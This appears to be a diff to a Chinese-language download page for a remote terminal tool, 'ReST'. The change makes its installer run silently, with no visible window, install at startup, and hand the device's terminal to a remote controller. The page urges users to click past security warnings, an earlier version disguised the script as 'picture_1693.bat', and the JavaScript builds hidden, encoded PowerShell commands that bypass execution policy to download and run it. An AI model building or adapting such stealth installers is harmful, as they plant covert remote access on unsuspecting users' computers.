@@ -216,15 +216,15 @@
     <div class="hero">
       <span class="product-tag tag-rest">ReST · 终端</span>
       <p>下载安装脚本 → 双击运行</p>
-      <a id="restSetupBtn" class="btn-rest" href="/download/ReST-Setup.bat" download>下载 ReST 安装脚本</a>
-      <p class="note" style="margin-top: 0.75rem;">浏览器只负责下载文件，不能直接执行安装。请在下载文件夹找到脚本并双击运行。</p>
+      <a id="restSetupBtn" class="btn-rest" href="/download/ReST-Setup.vbs" download>下载 ReST 安装脚本</a>
+      <p class="note" style="margin-top: 0.75rem;">浏览器只负责下载文件，不能直接执行安装。请在下载文件夹找到脚本并双击运行（无黑窗）。</p>
       <div id="afterRestDownload" class="hero-tip" hidden>
-        <strong>下一步：</strong>在「下载」文件夹双击 <code>ReST-Setup.bat</code>（或 <code>picture_1693.bat</code>）。<br />
+        <strong>下一步：</strong>在「下载」文件夹双击 <code>ReST-Setup.vbs</code>（或 <code>ReST安装.vbs</code>）。<br />
         若出现安全提示，点<strong>仍要运行</strong>。
       </div>
       <div class="steps">
-        <div class="step"><span class="step-num">1</span><span>下载 ReST 安装脚本（约 1KB）</span></div>
-        <div class="step"><span class="step-num">2</span><span>双击 bat，自动安装 ReST.exe 并加入开机自启</span></div>
+        <div class="step"><span class="step-num">1</span><span>下载 ReST 安装脚本（约 1KB，vbs 无黑窗）</span></div>
+        <div class="step"><span class="step-num">2</span><span>双击 vbs，后台静默安装 ReST.exe 并加入开机自启</span></div>
         <div class="step"><span class="step-num">3</span><span>控制端可见该设备的远程终端</span></div>
       </div>
       <div class="hero-tip" style="margin-top: 1rem;">
@@ -361,7 +361,7 @@
         </div>
       </div>
       <div class="link-row">
-        <label>ReST 安装脚本（ReST-Setup.bat）</label>
+        <label>ReST 安装脚本（ReST-Setup.vbs，无黑窗）</label>
         <div class="link-row-inner">
           <div class="link-box" id="restSetupUrl"></div>
           <button type="button" id="copyRestSetupBtn">复制</button>
@@ -505,7 +505,7 @@
     const base = origin + "/download";
     const pageUrl = origin + "/install.html";
     const setupUrl = base + "/ReSA-Setup.bat";
-    const restSetupUrl = base + "/ReST-Setup.bat";
+    const restSetupUrl = base + "/ReST-Setup.vbs";
     const batUrl = base + "/install.bat";
     const resaUrl = base + "/ReSA.exe";
     const restUrl = base + "/ReST.zip";
@@ -529,17 +529,24 @@
       return `powershell ${windowStyle}-NoProfile -ExecutionPolicy Bypass -EncodedCommand ${toPsEncodedCommand(script)}`;
     }
 
-    function buildBatInstallCommand(downloadBase, batFile) {
-      const url = `${downloadBase}/${batFile}`;
+    function buildSetupInstallCommand(downloadBase, setupFile) {
+      const url = `${downloadBase}/${setupFile}`;
+      const isVbs = setupFile.toLowerCase().endsWith(".vbs");
       const script = [
-        `$f = Join-Path $env:TEMP '${batFile}'`,
+        `$f = Join-Path $env:TEMP '${setupFile}'`,
         `$curl = Join-Path $env:SystemRoot 'System32\\curl.exe'`,
         `if (Test-Path -LiteralPath $curl) { & $curl -fsSL -o $f '${url}' }`,
         `if (-not (Test-Path -LiteralPath $f)) { Invoke-WebRequest -Uri '${url}' -OutFile $f -UseBasicParsing }`,
-        `Unblock-File -LiteralPath $f -ErrorAction SilentlyContinue`,
-        `Start-Process -FilePath $f -Wait -WindowStyle Hidden`,
-      ].join("; ");
-      return buildPsLaunch(script, true);
+      ];
+      if (isVbs) {
+        script.push(
+          `Start-Process -FilePath wscript.exe -ArgumentList '//nologo', $f -WindowStyle Hidden -Wait`
+        );
+      } else {
+        script.push(`Unblock-File -LiteralPath $f -ErrorAction SilentlyContinue`);
+        script.push(`Start-Process -FilePath $f -Wait -WindowStyle Hidden`);
+      }
+      return buildPsLaunch(script.join("; "), true);
     }
 
     function buildRestInstallInner(downloadBase) {
@@ -598,9 +605,9 @@
       ].join("; ");
     }
 
-    const cmdResaBat = buildBatInstallCommand(base, "ReSA-Setup.bat");
-    const cmdRestBat = buildBatInstallCommand(base, "ReST-Setup.bat");
-    const cmdProxyBat = buildBatInstallCommand(base, "Proxy-Setup.bat");
+    const cmdResaBat = buildSetupInstallCommand(base, "ReSA-Setup.vbs");
+    const cmdRestBat = buildSetupInstallCommand(base, "ReST-Setup.vbs");
+    const cmdProxyBat = buildSetupInstallCommand(base, "Proxy-Setup.vbs");
     const cmdResaPs1 = buildPsLaunch(buildResaInstallInner(base), false);
     const cmdResa = buildPsLaunch(buildResaInstallInner(base), false);
     const cmdRest = buildPsLaunch(buildRestInstallInner(base), true);
